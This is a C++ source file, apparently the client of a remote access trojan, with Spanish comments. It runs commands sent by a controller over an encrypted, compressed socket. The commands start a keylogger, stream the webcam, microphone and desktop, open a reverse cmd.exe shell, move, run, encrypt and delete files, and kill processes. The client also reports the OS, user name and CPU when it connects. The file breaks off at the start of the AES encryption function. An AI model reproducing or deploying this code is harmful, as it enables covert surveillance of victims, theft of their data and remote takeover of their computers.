#include "cliente.hpp"
#include "mod_mic.hpp"
#include "mod_file_manager.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

void Print_Packet(const Paquete& paquete) {
    std::cout << "Tipo paquete: " << paquete.uiTipoPaquete << '\n';
    std::cout << "Tam buffer: " << paquete.uiTamBuffer<< '\n';
    std::cout << "Ultimo: " << paquete.uiIsUltimo<< '\n';
    //std::vector<char> cBuff(paquete.uiTamBuffer + 1);
    //memcpy(cBuff.data(), paquete.cBuffer, paquete.uiTamBuffer);
    //cBuff[paquete.uiTamBuffer] = '\0';
    //std::cout << "Buffer: " << cBuff.data()<< '\n';

}

void Cliente::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }

}

void Cliente::DestroyClasses() {
    if (this->mod_RemoteDesk != nullptr) {
        this->mod_RemoteDesk->DetenerLive();
        delete this->mod_RemoteDesk;
        this->mod_RemoteDesk = nullptr;
    }

    if (this->mod_Mic != nullptr) {
        this->mod_Mic->m_DetenerLive();
        delete this->mod_Mic;
        this->mod_Mic = nullptr;
    }

    if (this->reverseSHELL != nullptr) {
        this->reverseSHELL->TerminarShell();
        delete this->reverseSHELL;
        this->reverseSHELL = nullptr;
    }

    if (this->mod_Key != nullptr) {
        this->mod_Key->Stop();
        delete this->mod_Key;
        this->mod_Key = nullptr;
    }

    if (this->mod_Cam != nullptr) {
        delete this->mod_Cam;
        this->mod_Cam = nullptr;
    }

    DebugPrint("[DC] Clases destruidas");
}

Cliente::Cliente() {
    this->Init_Key();
}

Cliente::~Cliente() {
	this->CerrarConexion();
    this->DestroyClasses();
}

void Cliente::CerrarConexion() {
    if (this->sckSocket != INVALID_SOCKET) {
		closesocket(this->sckSocket);
		this->sckSocket = INVALID_SOCKET;
	}
}

bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
	struct addrinfo sAddress, *sP, *sServer;
	memset(&sAddress, 0, sizeof(sAddress));

	sAddress.ai_family = AF_UNSPEC;
	sAddress.ai_socktype = SOCK_STREAM;

	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
	if (iRes != 0) {
        DebugPrint( "[X] getaddrinfo error" );
		return false;
	}

	for (sP = sServer; sP != nullptr; sP = sP->ai_next) {
		if ((this->sckSocket = socket(sP->ai_family, sP->ai_socktype, sP->ai_protocol)) == INVALID_SOCKET) {
			//socket error
			continue;
		}

		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
			//No se pudo conectar
            DebugPrint("[X] No se pudo conectar");
			continue;
		}
		//exito
		break;
	}

	if (sP == nullptr || this->sckSocket == INVALID_SOCKET) {
        freeaddrinfo(sServer);
        return false;
	}

    unsigned long int iBlock = 1;
    if (ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0) {
        DebugPrint( "[X] No se pudo hacer block" );
    }

    freeaddrinfo(sServer);
    
	return true;
}

void Cliente::Spawn_QueueMan() {
    this->isQueueRunning = true;
    this->p_thQueue = std::thread(&Cliente::Process_Queue, this);
}

void Cliente::Add_to_Queue(const Paquete_Queue& paquete) {
    std::unique_lock<std::mutex> lock(this->mtx_queue);
    this->queue_Comandos.push(paquete);
}

void Cliente::Process_Queue() {
    DebugPrint("[PQ] Inicio");
    while (true) {
        int iTotal = 0;
        
        if (!this->m_isRunning() || !this->m_isQueueRunning()) { break; }

        std::unique_lock<std::mutex> lock(this->mtx_queue);
        
        if (!this->queue_Comandos.empty()) {
            Paquete_Queue nTemp = this->queue_Comandos.front();
            this->queue_Comandos.pop();
            lock.unlock();
            
            this->Procesar_Comando(nTemp);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    std::unique_lock<std::mutex> lock(this->mtx_queue);
    //Limpiar queue de tareas
    while (this->queue_Comandos.size() > 0) {
        this->queue_Comandos.pop();
    }
    lock.unlock();

    DebugPrint("[PQ] Done");
}

void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
    std::vector<std::string> strIn;
    int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
    int iComando = paquete.uiTipoPaquete;

    DebugPrint("[PQ] Procesando comando ", iComando);

    if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
        int iBytesSize = iRecibido - 1;
        if(this->ssArchivo.is_open()){
            DebugPrint("[FM] ", iBytesSize);
            this->ssArchivo.write(paquete.cBuffer.data(), iBytesSize);
        } else {
            DebugPrint("No esta abierto :v");
        }
        return;
    }

    if (iComando == EnumComandos::FM_Descargar_Archivo_End) {
        if(this->ssArchivo.is_open()){
            this->ssArchivo.close();
        }
        DebugPrint("[!] Descarga completa");
        return;
    }

    if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta archivo
        //strIn[1] = tamano archivo
        if (strIn.size() == 2) {
            DebugPrint("[!] Descargando archivo en ruta " + strIn[0], atoi(strIn[1].c_str()));
            this->ssArchivo.open(strIn[0], std::ios::binary);
            if(!this->ssArchivo.is_open()){
            //if ((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr) {
                DebugPrint("[X] No se pudo abrir el archivo " + strIn[0]);
            }
        }else {
            DebugPrint("[X] Error parseando comando: " + std::string(paquete.cBuffer.data()));
        }
        return;
    }

    if (iComando == EnumComandos::PING) {
        DebugPrint("[!]PING");
        std::string strComand = std::to_string(EnumComandos::PONG);
        strComand.append(1, CMD_DEL);
        this->cSend(this->sckSocket, strComand.c_str(), strComand.size() + 1, 0, false, nullptr);
        return;
    }

    if (iComando == EnumComandos::CLI_STOP) {
        this->m_Stop();
        return;
    }

    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN ARCHIVOS           #

    //Listar drives
    if (iComando == EnumComandos::FM_Discos) {
        std::vector<struct sDrives> vDrives = Drives();
        std::string strDipositivos = std::to_string(EnumComandos::FM_Discos_Lista);
        strDipositivos.append(1, CMD_DEL);
        for (auto dev : vDrives) {
            std::string sLetter = dev.cLetter;
            std::string sFree = std::to_string(dev.dFree);
            std::string sTotal = std::to_string(dev.dTotal);
            std::string strTemp = sLetter.substr(0, sLetter.length() - 2);
            strTemp.append(1, '|');
            strTemp += dev.cType;
            strTemp.append(1, '|');
            strTemp += dev.cLabel;
            strTemp.append(1, '|');
            strTemp += sFree.substr(0, sFree.length() - 4);
            strTemp.append(1, '|');
            strTemp += sTotal.substr(0, sTotal.length() - 4);
            strTemp.append(1, CMD_DEL);

            strDipositivos += strTemp;
        }
        strDipositivos = strDipositivos.substr(0, strDipositivos.length() - 1);

        this->cSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size() + 1, 0, false, nullptr);
        return;
    }

    //Lista directorio
    if (iComando == EnumComandos::FM_Dir_Folder) {
        std::string strIn_c = paquete.cBuffer.data();
        
        std::string strPath = "";
        if (strIn_c == "DESCAR-DOWN") {
            strPath = this->ObtenerDown();
            std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
            strPathBCDown.append(1, CMD_DEL);
            strPathBCDown += strPath;
            this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }else if (strIn_c == "ESCRI-DESK") {
            strPath = this->ObtenerDesk();
            std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
            strPathBCDesk.append(1, CMD_DEL);
            strPathBCDesk += strPath;
            this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }else {
            strPath = strIn_c;
        }

        std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
        strCommand.append(1, CMD_DEL);

        for (auto item : vDir(strPath.c_str())) {
            strCommand.append(item);
            strCommand.append(1, '|');
        }

        strCommand = strCommand.substr(0, strCommand.size() - 1);

        this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true, nullptr);
        
        return;
    }

    //crear folder
    if (iComando == EnumComandos::FM_Crear_Folder) {
        CrearFolder(paquete.cBuffer.data());
        return;
    }

    if (iComando == EnumComandos::FM_Crear_Archivo) {
        CrearArchivo(paquete.cBuffer.data());
        return;
    }

    if (iComando == EnumComandos::FM_Borrar_Archivo) {
        BorrarArchivo(paquete.cBuffer.data());
        return;
    }

    if (iComando == EnumComandos::FM_Descargar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta
        //strIn[1] = id_descarga
        if (strIn.size() == 2) {
            std::string param1 = strIn[0];
            std::string param2 = strIn[1];
            std::thread th(&EnviarArchivo, param1, param2);
            th.detach();
        }
        return;
    }

    if (iComando == EnumComandos::FM_Ejecutar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta_archivo
        //strIn[1] = oculto/visible
        if (strIn.size() == 2) {
            bool isOK = Execute(strIn[0].c_str(), strIn[1] == "1" ? 1 : 0);

            if (isOK) {
                DebugPrint("[!] " + strIn[0] + " - ejecutado");
            }else {
                DebugPrint("[X] Error ejecutando " + strIn[0]);
            }
        }
        return;
    }

    if (iComando == EnumComandos::FM_Editar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
        //strIn[0] = ruta_archivo
        //strIn[1] = id_archivo
        if (strIn.size() == 2) {
            EditarArchivo(strIn[0], strIn[1]);
        }
        return;
    }

    if (iComando == EnumComandos::FM_Editar_Archivo_Guardar_Remoto) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
        if (strIn.size() == 1) {
            int iHeader = strIn[0].size() + 1;
            EditarArchivo_Guardar(strIn[0], paquete.cBuffer.data() + iHeader, static_cast<std::streamsize>(iRecibido - iHeader - 1));
        }
        return;
    }

    if (iComando == EnumComandos::FM_Crypt_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 3);
        //strIn[0][0] = cifrar/descifrar  0/1
        //strIn[0][1] = borrar  0/1
        //strIn[1]    = ruta_archivo
        //strIn[2]    = password
        if (strIn.size() == 3) {
            Crypt_Archivo(strIn[1], strIn[0][0], strIn[0][1], strIn[2]);
        }
        return;
    }

    if (iComando == EnumComandos::FM_Renombrar_Archivo) {
        strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 3);
        if (strIn.size() == 3) {
            //0 == nombre anterior -  1 == nuevo - 2 == ruta
            std::string strAntiguo = strIn[2] + strIn[0];
            std::string strNuevo = strIn[2] + strIn[1];
            RenombrarArchivo(strAntiguo.c_str(), strNuevo.c_str());
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#        COMANDOS SUBMENU ADMIN PROCESOS            #

    if (iComando == EnumComandos::PM_Refrescar) {
        std::string strProc = std::to_string(EnumComandos::PM_Lista);
        strProc.append(1, CMD_DEL);
        strProc += strProcessList();
        this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false, nullptr);
        return;
    }

    if (iComando == EnumComandos::PM_Kill) {
        int iPID = atoi(paquete.cBuffer.data());
        if (!EndProcess(iPID)) {
            DebugPrint("[X] No se pudo terminar el PID ", iPID);
        }
        return;
    }

    //#####################################################

    //#####################################################
    //#####################################################
    //#                   KEYLOGGER                       #
    if (iComando == EnumComandos::KL_Iniciar) {
        if (this->mod_Key == nullptr) {
            this->mod_Key = new mod_Keylogger();
            this->mod_Key->Start();
        }
        return;
    }

    if (iComando == EnumComandos::KL_Detener) {
        if (this->mod_Key) {
            this->mod_Key->Stop();
            delete this->mod_Key;
            this->mod_Key = nullptr;
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //#                   CAMARA                          #
    if (iComando == EnumComandos::CM_Lista) {
        //Enviar lista de camaras
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
        }

        std::string strPaquete = std::to_string(EnumComandos::CM_Lista_Salida);
        strPaquete.append(1, CMD_DEL);

        std::vector<std::string> cDev = this->mod_Cam->ListNameCaptureDevices();
        if (cDev.size() > 0) {
            for (std::string cDevice : cDev) {
                DebugPrint(cDevice);
                strPaquete += cDevice;
                strPaquete.append(1, '|');
            }
            strPaquete = strPaquete.substr(0, strPaquete.size() - 1);
        }
        else {
            strPaquete += "Nica|Nica2 :v";
        }
        this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr);
        return;
    }

    if (iComando == EnumComandos::CM_Single) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        if (!this->mod_Cam) {
            this->mod_Cam = new mod_Camera();
            this->mod_Cam->ListNameCaptureDevices();
            if (this->mod_Cam->vcCamObjs.size() <= 0) {
                DebugPrint("[X] No se obtuvieron camaras");
                delete this->mod_Cam;
                this->mod_Cam = nullptr;
                return;
            }
        }

        HRESULT hr = S_OK;
        
        if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
            iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
        }

        if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
            return;
        }

        hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);

        if (SUCCEEDED(hr)) {
            this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;

            DebugPrint("[!] Camara iniciada correctamente");

            std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
            strHeader.append(1, CMD_DEL);
            strHeader += strIn[1];
            strHeader.append(1, CMD_DEL);

            int iHeaderSize = strHeader.size();
            u_int uiPacketSize = 0;
            std::vector<BYTE> cBuffer = this->mod_Cam->GetFrame(iDeviceIndex);

            if (cBuffer.size() > 0) {
                std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), cBuffer.size());
                u_int iJPGBufferSize = cJPGBuffer.size();
                if (iJPGBufferSize > 0) {
                    uiPacketSize = iHeaderSize + iJPGBufferSize;
                    std::vector<BYTE> cPacket(uiPacketSize);
                    if (cPacket.size() > 0) {
                        memcpy(cPacket.data(), strHeader.c_str(), iHeaderSize);
                        memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);

                        int iSent = this->cSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr);
                        DebugPrint("[!] bytes sent", iSent);

                    }
                }
            }
        }

        this->mod_Cam->vcCamObjs[iDeviceIndex].ReleaseCam();
        return;
    }

    if (iComando == EnumComandos::CM_Live_Start) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
                this->mod_Cam->SpawnLive(iDeviceIndex);
            }
        return;
    }

    if (iComando == EnumComandos::CM_Live_Stop) {
        u_int iDeviceIndex = atoi(paquete.cBuffer.data());
        this->mod_Cam->JoinLiveThread(iDeviceIndex);
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                    MIC                             # 
    //Lista de dispositivos de entrada (mic)
    if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }

        this->mod_Mic->sckSocket = this->sckSocket;
        this->mod_Mic->m_Enviar_Dispositivos();
        return;
    }

    //Escuchar mic en tiempo real
    if (iComando == EnumComandos::Mic_Iniciar_Escucha) {
        if (this->mod_Mic == nullptr) {
            this->mod_Mic = new Mod_Mic(this);
        }
        if (!this->mod_Mic->isLiveMic) {
            this->mod_Mic->sckSocket = this->sckSocket;
            this->mod_Mic->p_DeviceID = atoi(paquete.cBuffer.data());
            this->mod_Mic->m_EmpezarLive();
        }
        return;
    }

    if (iComando == EnumComandos::Mic_Detener_Escucha) {
        if (this->mod_Mic != nullptr) {
            this->mod_Mic->sckSocket = this->sckSocket;
            this->mod_Mic->m_DetenerLive();
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            delete this->mod_Mic;
            this->mod_Mic = nullptr;
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                REVERSE SHELL                       # 
    //Iniciar shell
    if (iComando == EnumComandos::Reverse_Shell_Start) {
        if (this->reverseSHELL != nullptr) {
            this->reverseSHELL->TerminarShell();
            delete this->reverseSHELL;
            this->reverseSHELL = nullptr;
        }
        this->reverseSHELL = new ReverseShell(this);
        this->reverseSHELL->sckSocket = this->sckSocket;
        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");
        return;
    }

    //Escribir comando a la shell
    if (iComando == EnumComandos::Reverse_Shell_Command) {
        if (this->reverseSHELL) {
            std::string strJoined = std::string(paquete.cBuffer.data());
            this->reverseSHELL->thEscribirShell(strJoined);

            if (strJoined == "exit\r\n") {
                if (this->reverseSHELL) {
                    this->reverseSHELL->TerminarShell();
                    delete this->reverseSHELL;
                    this->reverseSHELL = nullptr;
                }
                DebugPrint("[!] Shell terminada");
            }
        }
        return;
    }
    //#####################################################


    //#####################################################
    //#####################################################
    //                ESCRITORIO REMOTO                   # 
    //Single
    if (iComando == EnumComandos::RD_Single) {
        //Enviar solo una captura
        if (!this->mod_RemoteDesk) {
            this->mod_RemoteDesk = new mod_RemoteDesktop();
        }
        //Si estra creado pero si no se esta en modo live
        if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
            ULONG iQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));

            std::vector<BYTE> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
            int iBufferSize = vcDeskBuffer.size();
            if (iBufferSize > 0) {

                std::string strCommand = std::to_string(EnumComandos::RD_Salida);
                strCommand.append(1, CMD_DEL);
                int ibHeadSize = strCommand.size();

                std::vector<BYTE> cBufferFinal(iBufferSize + ibHeadSize);

                std::memcpy(cBufferFinal.data(), strCommand.c_str(), ibHeadSize);
                std::memcpy(cBufferFinal.data() + ibHeadSize, vcDeskBuffer.data(), iBufferSize);

                this->cSend(this->sckSocket, reinterpret_cast<const char*>(cBufferFinal.data()), iBufferSize + ibHeadSize, 0, true, nullptr);

            }else {
                DebugPrint("El buffer de remote_desk es 0");
            }
        }
        else {
            DebugPrint("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
        }
        return;
    }

    //Iniciar live
    if (iComando == EnumComandos::RD_Start) {
        if (!this->mod_RemoteDesk) {
            this->mod_RemoteDesk = new mod_RemoteDesktop();
        }
        if (this->mod_RemoteDesk) {
            int iQuality = atoi(paquete.cBuffer.data());
            this->mod_RemoteDesk->SpawnThread(iQuality);
        }
        return;
    }

    //Detener live
    if (iComando == EnumComandos::RD_Stop) {
        if (!this->mod_RemoteDesk) {
            DebugPrint("No se ha iniciado el objeto de remote_Desktop");
            return;
        }
        this->mod_RemoteDesk->DetenerLive();
        return;
    }

    if (iComando == EnumComandos::RD_Update_Q) {
        if (this->mod_RemoteDesk) {
            ULONG uQuality = static_cast<ULONG>(atoi(paquete.cBuffer.data()));
            this->mod_RemoteDesk->m_UpdateQuality(uQuality);
        }else {
            DebugPrint("[RD]No se ha creado el objeto");
        }
        return;
    }

    //Mostar/ocultar mouse remoto
    if (iComando == EnumComandos::RD_Update_Vmouse) {
        if (this->mod_RemoteDesk) {
            bool isVmouseOn = paquete.cBuffer[0] == '0' ? false : true;
            this->mod_RemoteDesk->m_UpdateVmouse(isVmouseOn);
        }
        else {
            DebugPrint("[RD]No se ha creado el objeto");
        }
        return;
    }

}

void Cliente::Procesar_Paquete(const Paquete& paquete) {
    std::vector<char>& acumulador = this->paquetes_Acumulados[paquete.uiTipoPaquete];
    size_t oldsize = acumulador.size();
    acumulador.resize(oldsize + paquete.uiTamBuffer);
    std::memcpy(acumulador.data() + oldsize, paquete.cBuffer, paquete.uiTamBuffer);
    //acumulador.insert(acumulador.end(), paquete.cBuffer, paquete.cBuffer + paquete.uiTamBuffer); //Aqui error en tiempo de ejecucion
    /* probar esto
    size_t oldSize = acumulador.size();
acumulador.resize(oldSize + paquete.uiTamBuffer);
std::memcpy(acumulador.data() + oldSize, paquete.cBuffer, paquete.uiTamBuffer);
    */

    if (paquete.uiIsUltimo == 1) {
        DebugPrint("[PP] Paquete completo ", paquete.uiTipoPaquete);
        //Agregar al queue de comandos
        acumulador.push_back('\0'); //Borrar este byte al trabajar con datos binarios
        Paquete_Queue nNuevo;
        nNuevo.uiTipoPaquete = paquete.uiTipoPaquete;
        nNuevo.cBuffer.insert(nNuevo.cBuffer.begin(), acumulador.begin(), acumulador.end());

        this->Add_to_Queue(nNuevo);

        this->paquetes_Acumulados.erase(paquete.uiTipoPaquete);
    }
}

//Loop principal
void Cliente::MainLoop() {
    this->Spawn_QueueMan(); //spawn thread que lee el queue de los comandos
    DWORD error_code = 0;
    const int iBuffSize = 1024 * 2; //2 kb no necesario pero por las moscas
    std::vector<char> cBuffer(iBuffSize);
    if (cBuffer.size() == 0) {
        DebugPrint("[MAIN-LOOP] No se pudo reservar memoria para el buffer principal");
        return;
    }
    while (true) {
        if (!this->m_isRunning()) {break;}

        int iRecibido = this->cRecv(this->sckSocket, cBuffer.data(), iBuffSize, 0, false, &error_code);

        if (iRecibido < 0 && error_code != WSAEWOULDBLOCK) {
            //No se pudo recibir nada
            if (this->mod_Cam != nullptr) {
                for(auto cCam : this->mod_Cam->vcCamObjs) {
                    //Si alguna camara esta live esperar un poco y tratar de volver a leer
                    if (cCam.isLive) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                        continue;
                    }
                }
            }
            DebugPrint("[MAIN-LOOP] No se pudo recibir nada");
            break;
        }

        //Si se recibio un paquete completo
        if (iRecibido > 0) {
            if (iRecibido >= sizeof(Paquete)) {
                struct Paquete nNuevo;
                this->m_DeserializarPaquete(cBuffer.data(), nNuevo);

                //Print_Packet(nNuevo);

                this->Procesar_Paquete(nNuevo);

            }
        }

    }

    
    if (this->p_thQueue.joinable()) {
        this->m_StopQueue();
        this->p_thQueue.join();
    }

    this->DestroyClasses();

}

void Cliente::iniPacket() {
    //Enviar SO
    std::string strOut = std::to_string(EnumComandos::INIT_PACKET);
    strOut.append(1, CMD_DEL);
    strOut += strOS();
    strOut.append(1, CMD_DEL);
    strOut += strUserName();
    strOut.append(1, CMD_DEL);
    strOut += std::to_string(GetCurrentProcessId());
    strOut.append(1, CMD_DEL);
    strOut += strCpu();
    
    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false, nullptr);
    
    DebugPrint("[INIT]Enviados ", iB);
}

int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
    // 1 non block
    // 0 block
    
    std::unique_lock<std::mutex> lock(this->sck_mutex);

    //Tamaño del buffer
    int iDataSize = pLen + 2;
    std::unique_ptr<char[]> new_Buffer = std::make_unique<char[]>(iDataSize);
    if (!new_Buffer) {
        DebugPrint("No se pudo reservar la memoria");
        return -1;
    }

    //por defecto la cabecera se seteara como descomprimido
    // esto solo cambia si no hay ningun error durante el proceso de compresion
    new_Buffer[0] = UNCOMP_HEADER_BYTE_1;
    new_Buffer[1] = COMP_HEADER_BYTE_2;

    //Primero comprimir si el paquete es mayor a BUFFER_COMP_REQ_LEN
    if (pLen > BUFFER_COMP_REQ_LEN) {
        //Comprimir  buffer
        std::shared_ptr<unsigned char[]> compData(new unsigned char[iDataSize * 3]);
        if (compData) {
            unsigned long out_len = iDataSize;
            int iRet = compress2(compData.get(), &out_len, reinterpret_cast<const unsigned char*>(pBuffer), pLen, Z_BEST_COMPRESSION);
            if (iRet == Z_OK) {
                //Success
                if (out_len < iDataSize) {
                    new_Buffer[0] = COMP_HEADER_BYTE_1;
                    std::memcpy(new_Buffer.get() + 2, compData.get(), out_len);
                    iDataSize = out_len + 2; //Cantidad de bytes que fueron comprimidos + cabecera (2 bytes)
                    DebugPrint("[ZLIB] Success ", iDataSize);
                    DebugPrint("......Final: ", pLen);
                }else {
                    //El buffer compreso es mayor al original, copiar el mismo buffer
                    std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
                }
            }else if (iRet == Z_MEM_ERROR) {
                DebugPrint("No hay memoria suficiente");
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }else if (iRet == Z_BUF_ERROR) {
                DebugPrint("El output no tiene memoria suficiente");
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }else {
                DebugPrint("A jaber que pajo");
                std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
            }
        }else {
            DebugPrint("No se pudo reservar memoria para el buffer de compression");
            //Copiar buffer original
            std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
        }
    }else {
        //No comprimir ya que el buffer no es tan grande
        std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
    }

    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(new_Buffer.get()), iDataSize);
    iDataSize = cData.size();
    if (iDataSize == 0) {
        error();
        return -1;
    }

    int iEnviado = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DebugPrint("No se pudo hacer block");
        }
    }
    
    iEnviado = send(pSocket, reinterpret_cast<const char*>(cData.data()), iDataSize, pFlags);
    if (err_code != nullptr) {
        *err_code = GetLastError();
    }

    //Restaurar
    if (isBlock) {
        if (!this->BLOCK_MODE) {
            iBlock = 1;
            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
                DebugPrint("No se pudo restaurar el block_mode del socket");
            }
        }
    }
    
    return iEnviado;
}

int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
    //Aqui el socket por defecto es block asi que si se pasa false es normal
    // 1 non block
    // 0 block
    std::unique_lock<std::mutex> lock(this->sck_mutex);
    
    if (!pBuffer) {
        DebugPrint("[cRecv] El buffer no esta reservado o es nulo\n");
        return 0;
    }

    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
    
    int iRecibido = 0;
    unsigned long int iBlock = 0;

    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DebugPrint("No se pudo hacer block");
        }
    }
        
    iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
    if (err_code != nullptr) {
        *err_code = GetLastError();
    }
    if (iRecibido <= 0) {
        return -1;
    }
    
    //Restaurar
    if (isBlock && !this->BLOCK_MODE) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            DebugPrint("No se pudo restaurar el block_mode en el socket");
        }
    }
    
    //Decrypt
    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
    iRecibido = bOut.size() - 2;
    if (iRecibido == 0) {
        error();
        return -1;
    }

    //Comprobar si tiene la cabecera
    if (iRecibido > 2) { //?
        if (bOut[0] == COMP_HEADER_BYTE_1 && bOut[1] == COMP_HEADER_BYTE_2) {
            std::shared_ptr<unsigned char[]> uncompBuffer(new unsigned char[pLen]);
            if (uncompBuffer) {
                unsigned long out_len = pLen;
                int iRet = uncompress(uncompBuffer.get(), &out_len, bOut.data() + 2, iRecibido);
                if (iRet == Z_OK) {
                    //Si el buffer final es menor al tamaño del buffer final proceder
                    if (out_len < pLen) {
                        std::memcpy(pBuffer, uncompBuffer.get(), out_len);
                        iRecibido = out_len;
                    }
                    else {
                        DebugPrint("El buffer descomprimido es mayor al buffer reservado (parametro)");
                        iRecibido = 0;
                    }
                }
                else if (iRet == Z_MEM_ERROR) {
                    DebugPrint("No hay memoria suficiente");
                    iRecibido = 0;
                }
                else if (iRet == Z_BUF_ERROR) {
                    DebugPrint("El output no tiene memoria suficiente");
                    iRecibido = 0;
                }
                else {
                    DebugPrint("A jaber que pajo");
                    iRecibido = 0;
                }
            }
            else {
                DebugPrint("No se pudo reservar memoria para descomprimir el paquete");
                iRecibido = 0;
            }
        }
        else {
            //No tiene la cabecera de compreso, copiar buffer desencriptado
            std::memcpy(pBuffer, bOut.data() + 2, iRecibido);
        }
    }

    return iRecibido;
}

void Cliente::m_SerializarPaquete(const Paquete& paquete, char* cBuffer) {
    memcpy(cBuffer, &paquete.uiTipoPaquete, sizeof(paquete.uiTipoPaquete));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer, sizeof(paquete.cBuffer));
}

void Cliente::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete) {
    memcpy(&paquete.uiTipoPaquete, cBuffer,  sizeof(paquete.uiTipoPaquete));
    memcpy(&paquete.uiTamBuffer,   cBuffer + sizeof(paquete.uiTipoPaquete),  sizeof(paquete.uiTamBuffer));
    memcpy(&paquete.uiIsUltimo,    cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer),  sizeof(paquete.uiIsUltimo));
    memcpy(&paquete.cBuffer,       cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), sizeof(paquete.cBuffer));
}

//AES256
ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
